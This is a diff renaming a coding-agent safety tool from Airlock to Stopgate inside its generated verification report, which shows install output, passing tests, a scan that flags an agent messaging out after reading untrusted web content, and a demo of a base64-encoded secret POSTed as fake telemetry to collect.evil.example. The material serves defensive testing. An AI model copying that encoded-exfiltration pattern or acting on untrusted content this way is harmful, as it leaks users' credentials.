@@ -1,10 +1,10 @@
-AIRLOCK — PHASE 1 PROOF   (generated Mon Jul 13 08:14:51 PM UTC 2026 by independent verification, not self-report)
+STOPGATE — PHASE 1 PROOF   (generated Mon Jul 13 08:14:51 PM UTC 2026 by independent verification, not self-report)
 Verified in a clean venv (/tmp/airvenv) built from the repo. Every number below is real command output.
 
 ============================================================
 1. INSTALL — pip install -e . succeeds, console script on PATH
 ============================================================
-usage: airlock [-h] [--version] {report} ...
+usage: stopgate [-h] [--version] {report} ...
 
 Stop watching your agent. Local-first, zero-config safety for coding agents.
 
@@ -22,7 +22,7 @@ positional arguments:
 232 passed in 0.26s
 
 ============================================================
-3. airlock report — runs zero-config in <60s (bundled sample)
+3. stopgate report — runs zero-config in <60s (bundled sample)
 ============================================================
 
   Scanning log sample_session.jsonl ... (no config needed, nothing sent anywhere)
@@ -56,9 +56,9 @@ positional arguments:
    -->  step 6  step 8   messaging action 2 step(s) after untrusted read from 'web'
   ----------------------------------------------------------------
 
-  Airlock verdicts: 1 would notify, 3 would block until approved.
+  Stopgate verdicts: 1 would notify, 3 would block until approved.
 
-  Want Airlock to watch the next one?   airlock run -- claude "..."
+  Want Stopgate to watch the next one?   stopgate run -- claude "..."
   (unattended mode ships in a later phase; report is read-only today.)
    [	Elapsed (wall clock) time (h:mm:ss or m:ss): 0:00.02]
 
@@ -70,9 +70,9 @@ SECRET read earlier:       AKIAIOSFODNN7EXAMPLE wJalrXUtnFE ...
 Outbound payload (b64):    POST https://collect.evil.example  {"telemetry":"QUtJQUlPU0ZPRE5ON0VYQ ...
 
 (a) keyword/substring scan -> catches leak?  False    <-- what every competitor does
-(b) airlock egress match   -> catches leak?  True   (73 shingle fingerprints matched)
+(b) stopgate egress match   -> catches leak?  True   (73 shingle fingerprints matched)
 
-RESULT: AIRLOCK CATCHES WHAT KEYWORDS MISS
+RESULT: STOPGATE CATCHES WHAT KEYWORDS MISS
 
 ============================================================
 VERDICT: moat (taint/dataflow/egress) works end to end; report runs;
